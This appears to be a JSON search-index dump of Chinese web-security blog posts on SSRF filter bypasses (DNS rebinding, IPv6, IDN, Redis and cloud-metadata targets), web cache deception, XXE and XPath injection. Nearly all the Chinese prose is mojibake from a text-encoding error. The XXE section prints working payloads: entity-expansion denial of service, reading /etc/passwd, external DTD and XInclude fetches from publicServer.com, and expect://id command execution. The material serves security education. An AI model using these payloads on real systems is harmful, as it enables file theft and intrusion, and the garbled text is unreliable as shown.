ä½†æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸€æ¬¡å»è¯·æ±‚DNSæœåŠ¡è¿›è¡ŒåŸŸåè§£æåˆ°ç¬¬äºŒæ¬¡æœåŠ¡ç«¯å»è¯·æ±‚URLä¹‹é—´å­˜åœ¨ä¸€ä¸ªæ—¶é—´å·®ï¼Œåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œå¯ä»¥è¿›è¡ŒDNSé‡ç»‘å®šæ”»å‡»ã€‚ è¦å®ŒæˆDNSé‡ç»‘å®šæ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸŸåï¼Œå¹¶ä¸”å°†è¿™ä¸ªåŸŸåçš„è§£ææŒ‡å®šåˆ°æˆ‘ä»¬è‡ªå·±çš„DNS Serverï¼Œåœ¨æˆ‘ä»¬çš„å¯æ§çš„DNS Serverä¸Šç¼–å†™è§£ææœåŠ¡ï¼Œè®¾ç½®TTLæ—¶é—´ä¸º0ã€‚è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†ï¼Œå®Œæ•´çš„æ”»å‡»æµç¨‹ä¸ºï¼š æœåŠ¡å™¨ç«¯è·å¾—URLå‚æ•°ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡DNSè§£æï¼Œè·å¾—äº†ä¸€ä¸ªéå†…ç½‘çš„IP å¯¹äºè·å¾—çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå‘ç°ä¸ºéé»‘åå•IPï¼Œåˆ™é€šè¿‡éªŒè¯ æœåŠ¡å™¨ç«¯å¯¹äºURLè¿›è¡Œè®¿é—®ï¼Œç”±äºDNSæœåŠ¡å™¨è®¾ç½®çš„TTLä¸º0ï¼Œæ‰€ä»¥å†æ¬¡è¿›è¡ŒDNSè§£æï¼Œè¿™ä¸€æ¬¡DNSæœåŠ¡å™¨è¿”å›çš„æ˜¯å†…ç½‘åœ°å€ã€‚ ç”±äºå·²ç»ç»•è¿‡éªŒè¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯è¿”å›è®¿é—®å†…ç½‘èµ„æºçš„ç»“æœã€‚ åˆ©ç”¨IPv6æœ‰äº›æœåŠ¡æ²¡æœ‰è€ƒè™‘IPv6çš„æƒ…å†µï¼Œä½†æ˜¯å†…ç½‘åˆæ”¯æŒIPv6ï¼Œåˆ™å¯ä»¥ä½¿ç”¨IPv6çš„æœ¬åœ°IPå¦‚ [::] 0000::1 æˆ–IPv6çš„å†…ç½‘åŸŸåæ¥ç»•è¿‡è¿‡æ»¤ã€‚ åˆ©ç”¨IDNä¸€äº›ç½‘ç»œè®¿é—®å·¥å…·å¦‚Curlç­‰æ˜¯æ”¯æŒå›½é™…åŒ–åŸŸåï¼ˆInternationalized Domain Nameï¼ŒIDNï¼‰çš„ï¼Œå›½é™…åŒ–åŸŸååˆç§°ç‰¹æ®Šå­—ç¬¦åŸŸåï¼Œæ˜¯æŒ‡éƒ¨åˆ†æˆ–å®Œå…¨ä½¿ç”¨ç‰¹æ®Šçš„æ–‡å­—æˆ–å­—æ¯ç»„æˆçš„äº’è”ç½‘åŸŸåã€‚ åœ¨è¿™äº›å­—ç¬¦ä¸­ï¼Œéƒ¨åˆ†å­—ç¬¦ä¼šåœ¨è®¿é—®æ—¶åšä¸€ä¸ªç­‰ä»·è½¬æ¢ï¼Œä¾‹å¦‚ â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ å’Œ example.com ç­‰åŒã€‚åˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œå¯ä»¥ç”¨ â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© ç­‰å­—ç¬¦ç»•è¿‡å†…ç½‘é™åˆ¶ã€‚ å¯èƒ½çš„åˆ©ç”¨ç‚¹4.4.5.1. å†…ç½‘æœåŠ¡ Apache Hadoopè¿œç¨‹å‘½ä»¤æ‰§è¡Œ axis2-adminéƒ¨ç½²Serverå‘½ä»¤æ‰§è¡Œ Confluence SSRF counchdb WEB APIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ dict docker APIè¿œç¨‹å‘½ä»¤æ‰§è¡Œ Elasticsearchå¼•æ“Groovyè„šæœ¬å‘½ä»¤æ‰§è¡Œ ftp &#x2F; ftpsï¼ˆFTPçˆ†ç ´ï¼‰ glassfishä»»æ„æ–‡ä»¶è¯»å–å’Œwaræ–‡ä»¶éƒ¨ç½²é—´æ¥å‘½ä»¤æ‰§è¡Œ gopher HFSè¿œç¨‹å‘½ä»¤æ‰§è¡Œ httpã€https imap&#x2F;imaps&#x2F;pop3&#x2F;pop3s&#x2F;smtp&#x2F;smtpsï¼ˆçˆ†ç ´é‚®ä»¶ç”¨æˆ·åå¯†ç ï¼‰ Javaè°ƒè¯•æ¥å£å‘½ä»¤æ‰§è¡Œ JBOSSè¿œç¨‹Invoker warå‘½ä»¤æ‰§è¡Œ Jenkins Scriptsæ¥å£å‘½ä»¤æ‰§è¡Œ ldap mongodb php_fpm&#x2F;fastcgi å‘½ä»¤æ‰§è¡Œ rtsp - smb&#x2F;smbsï¼ˆè¿æ¥SMBï¼‰ sftp ShellShock å‘½ä»¤æ‰§è¡Œ Struts2 å‘½ä»¤æ‰§è¡Œ telnet tftpï¼ˆUDPåè®®æ‰©å±•ï¼‰ tomcatå‘½ä»¤æ‰§è¡Œ WebDav PUTä¸Šä¼ ä»»æ„æ–‡ä»¶ WebSphere Adminå¯éƒ¨ç½²waré—´æ¥å‘½ä»¤æ‰§è¡Œ zentoPMSè¿œç¨‹å‘½ä»¤æ‰§è¡Œ Redisåˆ©ç”¨ å†™sshå…¬é’¥ å†™crontab å†™WebShell Windowså†™å¯åŠ¨é¡¹ ä¸»ä»å¤åˆ¶åŠ è½½ .so æ–‡ä»¶ ä¸»ä»å¤åˆ¶å†™æ— æŸæ–‡ä»¶ äº‘ä¸»æœºåœ¨AWSã€Googleç­‰äº‘ç¯å¢ƒä¸‹ï¼Œé€šè¿‡è®¿é—®äº‘ç¯å¢ƒçš„å…ƒæ•°æ®APIæˆ–ç®¡ç†APIï¼Œåœ¨éƒ¨åˆ†æƒ…å†µä¸‹å¯ä»¥å®ç°æ•æ„Ÿä¿¡æ¯ç­‰æ•ˆæœã€‚ é˜²å¾¡æ–¹å¼ è¿‡æ»¤è¿”å›çš„ä¿¡æ¯ ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ é™åˆ¶è¯·æ±‚çš„ç«¯å£ ç¦æ­¢ä¸å¸¸ç”¨çš„åè®® å¯¹DNS Rebindingï¼Œè€ƒè™‘ä½¿ç”¨DNSç¼“å­˜æˆ–è€…Hostç™½åå•","categories":[],"tags":[]},{"title":"webcacheæ¬ºéª—æ”»å‡»","slug":"web caheæ¬ºéª—æ”»å‡»","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:44:04.568Z","comments":true,"path":"2023/12/26/web caheæ¬ºéª—æ”»å‡»/","link":"","permalink":"http://example.com/2023/12/26/web%20cahe%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/","excerpt":"Web Cacheæ¬ºéª—æ”»å‡»ç®€ä»‹ç½‘ç«™é€šå¸¸éƒ½ä¼šé€šè¿‡å¦‚CDNã€è´Ÿè½½å‡è¡¡å™¨ã€æˆ–è€…åå‘ä»£ç†æ¥å®ç°Webç¼“å­˜åŠŸèƒ½ã€‚é€šè¿‡ç¼“å­˜é¢‘ç¹è®¿é—®çš„æ–‡ä»¶ï¼Œé™ä½æœåŠ¡å™¨å“åº”å»¶è¿Ÿã€‚ ä¾‹å¦‚ï¼Œç½‘ç«™ htttp://www.example.com é…ç½®äº†åå‘ä»£ç†ã€‚å¯¹äºé‚£äº›åŒ…å«ç”¨æˆ·ä¸ªäººä¿¡æ¯çš„é¡µé¢ï¼Œå¦‚ http://www.example.com/home.php ï¼Œç”±äºæ¯ä¸ªç”¨æˆ·è¿”å›çš„å†…å®¹æœ‰æ‰€ä¸åŒï¼Œå› æ­¤è¿™ç±»é¡µé¢é€šå¸¸æ˜¯åŠ¨æ€ç”Ÿæˆï¼Œå¹¶ä¸ä¼šåœ¨ç¼“å­˜æœåŠ¡å™¨ä¸­è¿›è¡Œç¼“å­˜ã€‚é€šå¸¸ç¼“å­˜çš„ä¸»è¦æ˜¯å¯å…¬å¼€è®¿é—®çš„é™æ€æ–‡ä»¶ï¼Œå¦‚cssæ–‡ä»¶ã€jsæ–‡ä»¶ã€txtæ–‡ä»¶ã€å›¾ç‰‡ç­‰ç­‰ã€‚æ­¤å¤–ï¼Œå¾ˆå¤šæœ€ä½³å®è·µç±»çš„æ–‡ç« ä¹Ÿå»ºè®®ï¼Œå¯¹äºé‚£äº›èƒ½å…¬å¼€è®¿é—®çš„é™æ€æ–‡ä»¶è¿›è¡Œç¼“å­˜ï¼Œå¹¶ä¸”å¿½ç•¥HTTPç¼“å­˜å¤´ã€‚ Web cacheæ”»å‡»ç±»ä¼¼äºRPOç›¸å¯¹è·¯å¾„é‡å†™æ”»å‡»ï¼Œéƒ½ä¾èµ–äºæµè§ˆå™¨ä¸æœåŠ¡å™¨å¯¹URLçš„è§£ææ–¹å¼ã€‚å½“è®¿é—®ä¸å­˜åœ¨çš„URLæ—¶ï¼Œå¦‚ http://www.example.com/home.php/non-existent.css ï¼Œæµè§ˆå™¨å‘é€getè¯·æ±‚ï¼Œä¾èµ–äºä½¿ç”¨çš„æŠ€æœ¯ä¸é…ç½®ï¼ŒæœåŠ¡å™¨è¿”å›äº†é¡µé¢ http://www.example.com/home.php çš„å†…å®¹ï¼ŒåŒæ—¶URLåœ°å€ä»ç„¶æ˜¯ http://www.example.com/home.php/non-existent.cssï¼Œhttpå¤´çš„å†…å®¹ä¹Ÿä¸ç›´æ¥è®¿é—® http://www.example.com/home.php ç›¸åŒï¼Œcacheing headerã€content-typeï¼ˆæ­¤å¤„ä¸ºtext&#x2F;htmlï¼‰ä¹Ÿç›¸åŒã€‚","text":"Web Cacheæ¬ºéª—æ”»å‡»ç®€ä»‹ç½‘ç«™é€šå¸¸éƒ½ä¼šé€šè¿‡å¦‚CDNã€è´Ÿè½½å‡è¡¡å™¨ã€æˆ–è€…åå‘ä»£ç†æ¥å®ç°Webç¼“å­˜åŠŸèƒ½ã€‚é€šè¿‡ç¼“å­˜é¢‘ç¹è®¿é—®çš„æ–‡ä»¶ï¼Œé™ä½æœåŠ¡å™¨å“åº”å»¶è¿Ÿã€‚ ä¾‹å¦‚ï¼Œç½‘ç«™ htttp://www.example.com é…ç½®äº†åå‘ä»£ç†ã€‚å¯¹äºé‚£äº›åŒ…å«ç”¨æˆ·ä¸ªäººä¿¡æ¯çš„é¡µé¢ï¼Œå¦‚ http://www.example.com/home.php ï¼Œç”±äºæ¯ä¸ªç”¨æˆ·è¿”å›çš„å†…å®¹æœ‰æ‰€ä¸åŒï¼Œå› æ­¤è¿™ç±»é¡µé¢é€šå¸¸æ˜¯åŠ¨æ€ç”Ÿæˆï¼Œå¹¶ä¸ä¼šåœ¨ç¼“å­˜æœåŠ¡å™¨ä¸­è¿›è¡Œç¼“å­˜ã€‚é€šå¸¸ç¼“å­˜çš„ä¸»è¦æ˜¯å¯å…¬å¼€è®¿é—®çš„é™æ€æ–‡ä»¶ï¼Œå¦‚cssæ–‡ä»¶ã€jsæ–‡ä»¶ã€txtæ–‡ä»¶ã€å›¾ç‰‡ç­‰ç­‰ã€‚æ­¤å¤–ï¼Œå¾ˆå¤šæœ€ä½³å®è·µç±»çš„æ–‡ç« ä¹Ÿå»ºè®®ï¼Œå¯¹äºé‚£äº›èƒ½å…¬å¼€è®¿é—®çš„é™æ€æ–‡ä»¶è¿›è¡Œç¼“å­˜ï¼Œå¹¶ä¸”å¿½ç•¥HTTPç¼“å­˜å¤´ã€‚ Web cacheæ”»å‡»ç±»ä¼¼äºRPOç›¸å¯¹è·¯å¾„é‡å†™æ”»å‡»ï¼Œéƒ½ä¾èµ–äºæµè§ˆå™¨ä¸æœåŠ¡å™¨å¯¹URLçš„è§£ææ–¹å¼ã€‚å½“è®¿é—®ä¸å­˜åœ¨çš„URLæ—¶ï¼Œå¦‚ http://www.example.com/home.php/non-existent.css ï¼Œæµè§ˆå™¨å‘é€getè¯·æ±‚ï¼Œä¾èµ–äºä½¿ç”¨çš„æŠ€æœ¯ä¸é…ç½®ï¼ŒæœåŠ¡å™¨è¿”å›äº†é¡µé¢ http://www.example.com/home.php çš„å†…å®¹ï¼ŒåŒæ—¶URLåœ°å€ä»ç„¶æ˜¯ http://www.example.com/home.php/non-existent.cssï¼Œhttpå¤´çš„å†…å®¹ä¹Ÿä¸ç›´æ¥è®¿é—® http://www.example.com/home.php ç›¸åŒï¼Œcacheing headerã€content-typeï¼ˆæ­¤å¤„ä¸ºtext&#x2F;htmlï¼‰ä¹Ÿç›¸åŒã€‚ æ¼æ´æˆå› å½“ä»£ç†æœåŠ¡å™¨è®¾ç½®ä¸ºç¼“å­˜é™æ€æ–‡ä»¶å¹¶å¿½ç•¥è¿™ç±»æ–‡ä»¶çš„caching headeræ—¶ï¼Œè®¿é—® http://www.example.com/home.php/no-existent.css æ—¶ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿæ•´ä¸ªå“åº”æµç¨‹å¦‚ä¸‹ï¼š æµè§ˆå™¨è¯·æ±‚ http://www.example.com/home.php/no-existent.css ; æœåŠ¡å™¨è¿”å› http://www.example.com/home.php çš„å†…å®¹(é€šå¸¸æ¥è¯´ä¸ä¼šç¼“å­˜è¯¥é¡µé¢); å“åº”ç»è¿‡ä»£ç†æœåŠ¡å™¨; ä»£ç†è¯†åˆ«è¯¥æ–‡ä»¶æœ‰cssåç¼€; åœ¨ç¼“å­˜ç›®å½•ä¸‹ï¼Œä»£ç†æœåŠ¡å™¨åˆ›å»ºç›®å½• home.php ï¼Œå°†è¿”å›çš„å†…å®¹ä½œä¸º non-existent.css ä¿å­˜ã€‚ . æ¼æ´åˆ©ç”¨æ”»å‡»è€…æ¬ºéª—ç”¨æˆ·è®¿é—® http://www.example.com/home.php/logo.png?www.myhack58.com ,å¯¼è‡´å«æœ‰ç”¨æˆ·ä¸ªäººä¿¡æ¯çš„é¡µé¢è¢«ç¼“å­˜ï¼Œä»è€Œèƒ½è¢«å…¬å¼€è®¿é—®åˆ°ã€‚æ›´ä¸¥é‡çš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¿”å›çš„å†…å®¹åŒ…å«sessionæ ‡è¯†ã€å®‰å…¨é—®é¢˜çš„ç­”æ¡ˆï¼Œæˆ–è€…csrf tokenã€‚è¿™æ ·æ”»å‡»è€…èƒ½æ¥ç€è·å¾—è¿™äº›ä¿¡æ¯ï¼Œå› ä¸ºé€šå¸¸è€Œè¨€å¤§éƒ¨åˆ†ç½‘ç«™é™æ€èµ„æºéƒ½æ˜¯å…¬å¼€å¯è®¿é—®çš„ã€‚ æ¼æ´å­˜åœ¨çš„æ¡ä»¶æ¼æ´è¦å­˜åœ¨ï¼Œè‡³å°‘éœ€è¦æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ï¼š web cacheåŠŸèƒ½æ ¹æ®æ‰©å±•è¿›è¡Œä¿å­˜ï¼Œå¹¶å¿½ç•¥caching header; å½“è®¿é—®å¦‚ http://www.example.com/home.php/non-existent.css ä¸å­˜åœ¨çš„é¡µé¢ï¼Œä¼šè¿”å› home.php çš„å†…å®¹ã€‚ æ¼æ´é˜²å¾¡é˜²å¾¡æªæ–½ä¸»è¦åŒ…æ‹¬3ç‚¹ï¼š è®¾ç½®ç¼“å­˜æœºåˆ¶ï¼Œä»…ä»…ç¼“å­˜http caching headerå…è®¸çš„æ–‡ä»¶ï¼Œè¿™èƒ½ä»æ ¹æœ¬ä¸Šæœç»è¯¥é—®é¢˜; å¦‚æœç¼“å­˜ç»„ä»¶æä¾›é€‰é¡¹ï¼Œè®¾ç½®ä¸ºæ ¹æ®content-typeè¿›è¡Œç¼“å­˜; è®¿é—® http://www.example.com/home.php/non-existent.css è¿™ç±»ä¸å­˜åœ¨é¡µé¢ï¼Œä¸è¿”å› home.php çš„å†…å®¹ï¼Œè€Œè¿”å›404æˆ–è€…302ã€‚ Web Cacheæ¬ºéª—æ”»å‡»å®ä¾‹PaypalPaypalåœ¨æœªä¿®å¤ä¹‹å‰ï¼Œé€šè¿‡è¯¥æ”»å‡»ï¼Œå¯ä»¥è·å–çš„ä¿¡æ¯åŒ…æ‹¬ï¼šç”¨æˆ·å§“åã€è´¦æˆ·é‡‘é¢ã€ä¿¡ç”¨å¡çš„æœ€å4ä½æ•°ã€äº¤æ˜“æ•°æ®ã€emaillåœ°å€ç­‰ä¿¡æ¯ã€‚ å—è¯¥æ”»å‡»çš„éƒ¨åˆ†é¡µé¢åŒ…æ‹¬ï¼š https://www.paypal.com/myaccount/home/attack.css https://www.paypal.com/myaccount/settings/notifications/attack.css https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details ã€‚","categories":[],"tags":[]},{"title":"xxe","slug":"xee","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:44:20.953Z","comments":true,"path":"2023/12/26/xee/","link":"","permalink":"http://example.com/2023/12/26/xee/","excerpt":"XXE [TOC] XMLåŸºç¡€XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆeXtensible Markup Languageï¼‰ï¼Œæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œè¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚ç›®å‰ï¼ŒXMLæ–‡ä»¶ä½œä¸ºé…ç½®æ–‡ä»¶ï¼ˆSpringã€Struts2ç­‰ï¼‰ã€æ–‡æ¡£ç»“æ„è¯´æ˜æ–‡ä»¶ï¼ˆPDFã€RSSç­‰ï¼‰ã€å›¾ç‰‡æ ¼å¼æ–‡ä»¶ï¼ˆSVG headerï¼‰åº”ç”¨æ¯”è¾ƒå¹¿æ³›ã€‚ XML çš„è¯­æ³•è§„èŒƒç”± DTD ï¼ˆDocument Type Definitionï¼‰æ¥è¿›è¡Œæ§åˆ¶ã€‚","text":"XXE [TOC] XMLåŸºç¡€XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆeXtensible Markup Languageï¼‰ï¼Œæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œè¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚ç›®å‰ï¼ŒXMLæ–‡ä»¶ä½œä¸ºé…ç½®æ–‡ä»¶ï¼ˆSpringã€Struts2ç­‰ï¼‰ã€æ–‡æ¡£ç»“æ„è¯´æ˜æ–‡ä»¶ï¼ˆPDFã€RSSç­‰ï¼‰ã€å›¾ç‰‡æ ¼å¼æ–‡ä»¶ï¼ˆSVG headerï¼‰åº”ç”¨æ¯”è¾ƒå¹¿æ³›ã€‚ XML çš„è¯­æ³•è§„èŒƒç”± DTD ï¼ˆDocument Type Definitionï¼‰æ¥è¿›è¡Œæ§åˆ¶ã€‚ åŸºæœ¬è¯­æ³•XML æ–‡æ¡£åœ¨å¼€å¤´æœ‰ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; çš„ç»“æ„ï¼Œè¿™ç§ç»“æ„è¢«ç§°ä¸º XML prolog ï¼Œç”¨äºå£°æ˜XMLæ–‡æ¡£çš„ç‰ˆæœ¬å’Œç¼–ç ï¼Œæ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯å¿…é¡»æ”¾åœ¨æ–‡æ¡£å¼€å¤´ã€‚ é™¤äº†å¯é€‰çš„å¼€å¤´å¤–ï¼ŒXML è¯­æ³•ä¸»è¦æœ‰ä»¥ä¸‹çš„ç‰¹æ€§ï¼š æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾ XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿ XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥— XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´  XML çš„å±æ€§å€¼éœ€è¦åŠ å¼•å· å¦å¤–ï¼ŒXMLä¹Ÿæœ‰CDATAè¯­æ³•ï¼Œç”¨äºå¤„ç†æœ‰å¤šä¸ªå­—ç¬¦éœ€è¦è½¬ä¹‰çš„æƒ…å†µã€‚ XXEå½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œå¯é€šè¿‡æ„é€ æ¶æ„çš„XMLå†…å®¹ï¼Œå¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰åæœã€‚ä¸€èˆ¬çš„XXEæ”»å‡»ï¼Œåªæœ‰åœ¨æœåŠ¡å™¨æœ‰å›æ˜¾æˆ–è€…æŠ¥é”™çš„åŸºç¡€ä¸Šæ‰èƒ½ä½¿ç”¨XXEæ¼æ´æ¥è¯»å–æœåŠ¡å™¨ç«¯æ–‡ä»¶ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥é€šè¿‡Blind XXEçš„æ–¹å¼å®ç°æ”»å‡»ã€‚ æ”»å‡»æ–¹å¼æ‹’ç»æœåŠ¡æ”»å‡»1234567&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;/data&gt; è‹¥è§£æè¿‡ç¨‹éå¸¸ç¼“æ…¢ï¼Œåˆ™è¡¨ç¤ºæµ‹è¯•æˆåŠŸï¼Œç›®æ ‡ç«™ç‚¹å¯èƒ½æœ‰æ‹’ç»æœåŠ¡æ¼æ´ã€‚ å…·ä½“æ”»å‡»å¯ä½¿ç”¨æ›´å¤šå±‚çš„è¿­ä»£æˆ–é€’å½’ï¼Œä¹Ÿå¯å¼•ç”¨å·¨å¤§çš„å¤–éƒ¨å®ä½“ï¼Œä»¥å®ç°æ”»å‡»çš„æ•ˆæœã€‚ æ–‡ä»¶è¯»å–123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;data&gt;&amp;file;&lt;/data&gt; SSRF12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [&lt;!ELEMENT data (#ANY)&gt;]&gt;&lt;data&gt;4&lt;/data&gt; RCE12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;/core&gt;&lt;/catalog&gt; XInclude12&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/da","categories":[],"tags":[]},{"title":"xpathæ³¨å…¥","slug":"xpath","date":"2023-12-25T18:01:50.000Z","updated":"2024-01-21T16:44:27.095Z","comments":true,"path":"2023/12/26/xpath/","link":"","permalink":"http://example.com/2023/12/26/xpath/","excerpt":"Xpathæ³¨å…¥ [TOC] Xpathå®šä¹‰XPathæ³¨å…¥æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨XPathè§£æå™¨çš„æ¾æ•£è¾“å…¥å’Œå®¹é”™ç‰¹æ€§ï¼Œèƒ½å¤Ÿåœ¨ URLã€è¡¨å•æˆ–å…¶å®ƒä¿¡æ¯ä¸Šé™„å¸¦æ¶æ„çš„XPath æŸ¥è¯¢ä»£ç ï¼Œä»¥è·å¾—æƒé™ä¿¡æ¯çš„è®¿é—®æƒå¹¶æ›´æ”¹è¿™äº›ä¿¡æ¯ã€‚XPathæ³¨å…¥æ”»å‡»æ˜¯é’ˆå¯¹WebæœåŠ¡åº”ç”¨æ–°çš„æ”»å‡»æ–¹æ³•ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨äº‹å…ˆä¸çŸ¥é“XPathæŸ¥è¯¢ç›¸å…³çŸ¥è¯†çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡XPathæŸ¥è¯¢å¾—åˆ°ä¸€ä¸ªXMLæ–‡æ¡£çš„å®Œæ•´å†…å®¹ã€‚","text":"Xpathæ³¨å…¥ [TOC] Xpathå®šä¹‰XPathæ³¨å…¥æ”»å‡»æ˜¯æŒ‡åˆ©ç”¨XPathè§£æå™¨çš„æ¾æ•£è¾“å…¥å’Œå®¹é”™ç‰¹æ€§ï¼Œèƒ½å¤Ÿåœ¨ URLã€è¡¨å•æˆ–å…¶å®ƒä¿¡æ¯ä¸Šé™„å¸¦æ¶æ„çš„XPath æŸ¥è¯¢ä»£ç ï¼Œä»¥è·å¾—æƒé™ä¿¡æ¯çš„è®¿é—®æƒå¹¶æ›´æ”¹è¿™äº›ä¿¡æ¯ã€‚XPathæ³¨å…¥æ”»å‡»æ˜¯é’ˆå¯¹WebæœåŠ¡åº”ç”¨æ–°çš„æ”»å‡»æ–¹æ³•ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨äº‹å…ˆä¸çŸ¥é“XPathæŸ¥è¯¢ç›¸å…³çŸ¥è¯†çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡XPathæŸ¥è¯¢å¾—åˆ°ä¸€ä¸ªXMLæ–‡æ¡£çš„å®Œæ•´å†…å®¹ã€‚ Xpathæ³¨å…¥æ”»å‡»åŸç† XPathæ³¨å…¥æ”»å‡»ä¸»è¦æ˜¯é€šè¿‡æ„å»ºç‰¹æ®Šçš„è¾“å…¥ï¼Œè¿™äº›è¾“å…¥å¾€å¾€æ˜¯XPathè¯­æ³•ä¸­çš„ä¸€äº›ç»„åˆï¼Œè¿™äº›è¾“å…¥å°†ä½œä¸ºå‚æ•°ä¼ å…¥Web åº”ç”¨ç¨‹åºï¼Œé€šè¿‡æ‰§è¡ŒXPathæŸ¥è¯¢è€Œæ‰§è¡Œå…¥ä¾µè€…æƒ³è¦çš„æ“ä½œï¼Œä¸‹é¢ä»¥ç™»å½•éªŒè¯ä¸­çš„æ¨¡å—ä¸ºä¾‹ï¼Œè¯´æ˜ XPathæ³¨å…¥æ”»å‡»çš„å®ç°åŸç†ã€‚ åœ¨Web åº”ç”¨ç¨‹åºçš„ç™»å½•éªŒè¯ç¨‹åºä¸­ï¼Œä¸€èˆ¬æœ‰ç”¨æˆ·åï¼ˆusernameï¼‰å’Œå¯†ç ï¼ˆpasswordï¼‰ ä¸¤ä¸ªå‚æ•°ï¼Œç¨‹åºä¼šé€šè¿‡ç”¨æˆ·æ‰€æäº¤è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç æ¥æ‰§è¡Œæˆæƒæ“ä½œã€‚è‹¥éªŒè¯æ•°æ®å­˜æ”¾åœ¨XMLæ–‡ä»¶ä¸­ï¼Œå…¶åŸç†æ˜¯é€šè¿‡æŸ¥æ‰¾userè¡¨ä¸­çš„ç”¨æˆ·å ï¼ˆusernameï¼‰å’Œå¯†ç ï¼ˆpasswordï¼‰çš„ç»“æœæ¥è¿›è¡Œæˆæƒè®¿é—®ï¼Œ ä¾‹å­˜åœ¨user.xmlæ–‡ä»¶å¦‚ä¸‹ï¼š 12345678910111213&lt;users&gt; &lt;user&gt; &lt;firstname&gt;Ben&lt;/firstname&gt; &lt;lastname&gt;Elmore&lt;/lastname&gt; &lt;loginID&gt;abc&lt;/loginID&gt; &lt;password&gt;test123&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;firstname&gt;Shlomy&lt;/firstname&gt; &lt;lastname&gt;Gantz&lt;/lastname&gt; &lt;loginID&gt;xyz&lt;/loginID&gt; &lt;password&gt;123test&lt;/password&gt; &lt;/user&gt; åˆ™åœ¨XPathä¸­å…¶å…¸å‹çš„æŸ¥è¯¢è¯­å¥ä¸ºï¼š //users/user[loginID/text()=&#39;xyz&#39;and password/text()=&#39;123test&#39;] 